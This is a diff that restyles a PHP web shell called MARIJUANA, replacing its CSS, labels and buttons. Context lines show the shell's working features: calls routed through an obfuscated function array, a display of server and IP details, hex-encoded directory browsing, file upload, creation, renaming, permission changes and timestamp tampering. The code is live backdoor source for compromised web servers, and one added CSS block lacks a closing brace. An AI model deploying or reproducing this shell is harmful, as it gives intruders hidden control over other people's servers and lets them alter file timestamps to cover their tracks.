@@ -55,17 +55,152 @@ for($i=0;$i<$___;$i++) {
 				<title>MARIJUANA</title>
 
 			<link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
-			<link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">
+                        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
 
 			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Kelly+Slab&display=swap');
+html {
+    margin-left: 1em!important;
+    margin-right: 1em!important;
+    margin-top: -1.5em!important;
+    background: #00bfff!important;
+    font-family: 'Kelly Slab'!important;
+}
+.x {
+text-align:center;
+}
+.y:hover {
+color:#fff;
+}
+.w {
+color:#fff;
+}
+.b {
+color:#000;
+}
+.q {
+margin-top: 2px;
+}
+article {
+margin-top: 5px!important;
+font-size: medium!important;
+}
+.i {
+float:left;
+}
+.u {
+float:right;
+text-align:right;
+margin-bottom:5px;
+}
+input[type=file] {
+display: block!important;
+cursor: pointer!important;
+color: black!important;
+font-size: medium!important;
+border: 2px solid black!important;
+border-radius: 5px!important;
+padding: 0px!important;
+font-family: 'Kelly Slab', cursive;
+}
+input[type=file]:hover {
+border: 2px solid white!important;
+}
+input[type=submit] {
+    font-family: 'Kelly Slab', cursive;
+    -webkit-appearance: button!important;
+    cursor: pointer!important;
+    color: black!important;
+    font-size: medium!important;
+    border: 2px solid black!important;
+    border-radius: 5px!important;
+    margin-top: 5px!important;
+    margin-left: 5px!important;
+    padding-left: 10px!important;
+    padding-right: 10px!important;
+    padding-bottom: 3px!important;
+    background: transparent!important;
+    padding-top: 1px!important;
+}
+input[type=submit]:hover {
+    border: 2px solid white!important;
+}
+td{
+color:#000;
+}
+th {
+    font-weight: normal!important;
+    border-bottom: 2px solid #181818!important;
+    color: black!important;
+}
+.et {
+text-align:left;
+color:#000;
+}
+.r:hover {
+background: #0299cc!important;
+}
+.l {
+border:1px solid #181818;
+padding:1px;
+background:0 0;
+}
+footer {
+width:100%;
+font-size:medium;
+}
+footer:hover {
+color:#fff;
+}
+a {
+text-decoration:none;
+color:#000;
+}
+a:hover {
+color:#fff;
+}
+.m {
+margin-left: 2px;
+}
+textarea {
+    background: transparent!important;
+    color: black!important;
+    font-family: 'Kelly Slab'!important;
+    font-size: medium!important;
+    width: 100%!important;
+    border: 2px solid black!important;
+    border-radius: 5px!important;
+    height: 50vh!important;
+textarea.o {
+    background: transparent!important;
+    color: black!important;
+    font-family: 'Kelly Slab'!important;
+    font-size: medium!important;
+    width: 100%!important;
+    border: 2px solid black!important;
+    border-radius: 5px!important;
+}
+input {
+    background: transparent!important;
+    font-size: medium!important;
+    border: 2px solid black!important;
+    font-family: 'Kelly Slab'!important;
+    border-radius: 5px!important;
+    padding: 2px!important;
+}
+.h {
+color:#ea2027;
+}
+</style>
 		</head>
 
 		<body>
-			<header>
+			<header style="margin-top: 20px;">
 				<div class="y x">
-					<a class="ajx" href="<?php echo basename($_SERVER['PHP_SELF']);?>">
-						MARIJuANA
+					<a class="ajx" style="font-size: xx-large;" href="<?php echo basename($_SERVER['PHP_SELF']);?>">
+						MARIJUANA
 					</a>
 				</div>
 
@@ -77,16 +212,21 @@ for($i=0;$i<$___;$i++) {
 
 			<article>
 				<div class="i">
-					<i class="far fa-hdd"></i>
+					 &thinsp;&thinsp;<b>Server  :</b> 
 					<?php echo $GNJ[0]();?>
 
 					<br />
 
-					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>
+					 &thinsp;&thinsp;<b>Software  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?>
+<br />
+ &thinsp;&thinsp;<b>PHP Version  :</b> <?php echo $GNJ[1]();?>
 
 					<br />
+				 &thinsp;&thinsp;<b>IP Address :</b> 
+					<?php echo $_SERVER['SERVER_ADDR'];?>
+					<br />
 
-					<i class="far fa-folder"></i>
+					&thinsp;&thinsp;<b>Directory  :</b> 
 					
 					<?php
 					if(isset($_GET["d"])) {
@@ -99,7 +239,7 @@ for($i=0;$i<$___;$i++) {
 					$k = $GNJ[4]("/(\\\|\/)/", $d );
 					foreach ($k as $m => $l) { 
 						if($l=='' && $m==0) {
-							echo '<a class="ajx" href="?d=2f">/</a>';
+							echo '<a class="ajx" href="?d=2f">~</a>/';
 						}
 						if($l == '') { 
 							continue;
@@ -116,19 +256,11 @@ for($i=0;$i<$___;$i++) {
 					?>
 
 					<br />
-
-				</div>
-
-				<div class="u">
-					<?php echo $_SERVER['SERVER_ADDR'];?> <i class="fas fa-link"></i>
-					<br />
-
-					<br />
+<br />
 
 					<form method="post" enctype="multipart/form-data">
-						<label class="l w">
-							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD
-						</label>&nbsp;
+						
+							<input type="file" name="n[]" onchange="this.form.submit()" multiple>
 					</form>
 
 					<?php
@@ -257,7 +389,7 @@ for($i=0;$i<$___;$i++) {
 					elseif(isset($_GET["t"])) {
 						echo $a_.uhex($_GET["t"]).$b_.'
 									<form action="" method="post">
-										<input name="t" class="x" type="text" value="'.$GNJ[20]("Y-m-d H:i", $GNJ[21](uhex($_GET["t"]))).'">
+										<input name="t" style="background: transparent!important;font-size: medium!important;border: 2px solid black!important;border-radius: 5px!important;padding: 2px!important;text-align: center;font-family: inherit;" type="text" value="'.$GNJ[20]("Y-m-d H:i", $GNJ[21](uhex($_GET["t"]))).'">
 										'.$d_.'
 								'.$c_;
 					if( !empty($_POST["t"]) ) {
@@ -278,7 +410,7 @@ for($i=0;$i<$___;$i++) {
 					elseif(isset($_GET["k"])) {
 						echo $a_.uhex($_GET["k"]).$b_.'
 									<form action="" method="post">
-										<input name="b" class="x" type="text" value="'.$GNJ[22]($GNJ[23]('%o', $GNJ[24](uhex($_GET["k"]))), -4).'">
+										<input name="b" style="background: transparent!important;font-size: medium!important;border: 2px solid black!important;border-radius: 5px!important;padding: 2px!important;text-align: center;font-family: inherit;" type="text" value="'.$GNJ[22]($GNJ[23]('%o', $GNJ[24](uhex($_GET["k"]))), -4).'">
 										'.$d_.'
 								'.$c_;
 					if(!empty($_POST["b"])) {
@@ -297,7 +429,7 @@ for($i=0;$i<$___;$i++) {
 					elseif(isset($_GET["l"])) {
 						echo $a_.'+DIR'.$b_.'
 									<form action="" method="post">
-										<input name="l" class="x" type="text" value="">
+										<input name="l" style="background: transparent!important;font-size: medium!important;border: 2px solid black!important;border-radius: 5px!important;padding: 2px!important;text-align: center;font-family: inherit;" type="text" value="">
 										'.$d_.'
 								'.$c_;
 					if(isset($_POST["l"])) {
@@ -322,7 +454,7 @@ for($i=0;$i<$___;$i++) {
 					elseif(isset($_GET["n"])) {
 						echo $a_.'+FILE'.$b_.'
 									<form action="" method="post">
-										<input name="n" class="x" type="text" value="">
+										<input name="n" style="background: transparent!important;font-size: medium!important;border: 2px solid black!important;border-radius: 5px!important;padding: 2px!important;text-align: center;font-family: inherit;" type="text" value="">
 										'.$d_.'
 								'.$c_;
 					if(isset($_POST["n"])) {
@@ -337,7 +469,7 @@ for($i=0;$i<$___;$i++) {
 					elseif(isset($_GET["r"])) {
 						echo $a_.uhex($_GET["r"]).$b_.'
 									<form action="" method="post">
-										<input name="r" class="x" type="text" value="'.uhex($_GET["r"]).'">
+										<input name="r" style="background: transparent!important;font-size: medium!important;border: 2px solid black!important;border-radius: 5px!important;padding: 2px!important;text-align: center;font-family: inherit;" type="text" value="'.uhex($_GET["r"]).'">
 										'.$d_.'
 								'.$c_;
 					if(isset($_POST["r"])) {
@@ -373,14 +505,40 @@ for($i=0;$i<$___;$i++) {
 								<th width="11%">[ SIZE ]</th>
 								<th width="17%">[ PERM ]</th>
 								<th width="17%">[ DATE ]</th>
-								<th width="11%">[ ACT ]</th>
+								<th width="11%">[ ACTION ]</th>
 							</tr>
 						</thead>
 						<tbody>
 							<tr>
 								<td>
-									<a class="ajx" href="?d='.hex($d).'&n">+FILE</a>
-									<a class="ajx" href="?d='.hex($d).'&l">+DIR</a>
+									<a class="ajx" href="?d='.hex($d).'&n" style="
+-webkit-appearance: button!important;
+cursor: pointer!important;
+font-size: medium!important;
+border: 1.5px solid black!important;
+border-radius: 5px!important;
+margin-top: 5px!important;
+margin-left: 5px!important;
+padding-left: 10px!important;
+padding-right: 10px!important;
+padding-bottom: 3px!important;
+background: transparent!important;
+padding-top: 1px!important;
+"><b>Add File</b></a>
+									<a class="ajx" href="?d='.hex($d).'&l" style="
+-webkit-appearance: button!important;
+cursor: pointer!important;
+font-size: medium!important;
+border: 1.5px solid black!important;
+border-radius: 5px!important;
+margin-top: 5px!important;
+margin-left: 5px!important;
+padding-left: 10px!important;
+padding-right: 10px!important;
+padding-bottom: 3px!important;
+background: transparent!important;
+padding-top: 1px!important;
+"><b>Add Directory</b></a>
 								</td>
 							</tr>
 						';
@@ -472,8 +630,34 @@ for($i=0;$i<$___;$i++) {
 						<tfoot>
 							<tr>
 								<th class="et">
-									<a class="ajx" href="?d='.hex($e).'&y">REQUEST</a>
-									<a href="?d='.hex($e).'&q">EXIT</a>
+									<a class="ajx" href="?d='.hex($e).'&y" style="
+-webkit-appearance: button!important;
+cursor: pointer!important;
+font-size: medium!important;
+border: 1.5px solid black!important;
+border-radius: 5px!important;
+margin-top: 5px!important;
+margin-left: 5px!important;
+padding-left: 10px!important;
+padding-right: 10px!important;
+padding-bottom: 3px!important;
+background: transparent!important;
+padding-top: 1px!important;
+"><b>Request</b></a>
+									<a href="?d='.hex($e).'&q" style="
+-webkit-appearance: button!important;
+cursor: pointer!important;
+font-size: medium!important;
+border: 1.5px solid black!important;
+border-radius: 5px!important;
+margin-top: 5px!important;
+margin-left: 5px!important;
+padding-left: 10px!important;
+padding-right: 10px!important;
+padding-bottom: 3px!important;
+background: transparent!important;
+padding-top: 1px!important;
+"><b>Exit</b></a>
 								</th>
 								<th class="et" width="11%"></th>
 								<th class="et" width="17%"></th>
